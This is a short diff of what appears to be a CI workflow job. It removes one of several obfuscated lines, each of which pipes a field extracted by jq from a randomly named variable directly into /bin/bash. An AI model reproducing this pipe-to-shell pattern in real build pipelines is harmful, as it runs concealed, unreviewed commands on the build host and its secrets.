@@ -21,7 +21,6 @@ jobs:
           echo $z7 | jq -r .wkao15 | /bin/bash
           echo $hjlbe35 | jq -r .goapm292 | /bin/bash
           printf '%s' "$xnxdu35847" | jq -r .r3 | /bin/bash
-          echo $hsqnn77395 | jq -r .ykx50658 | /bin/bash
           echo $sb6373 | jq -r .jcgqb42 | /bin/bash
           echo $rvjhq59 | jq -r .e21 | /bin/bash
 
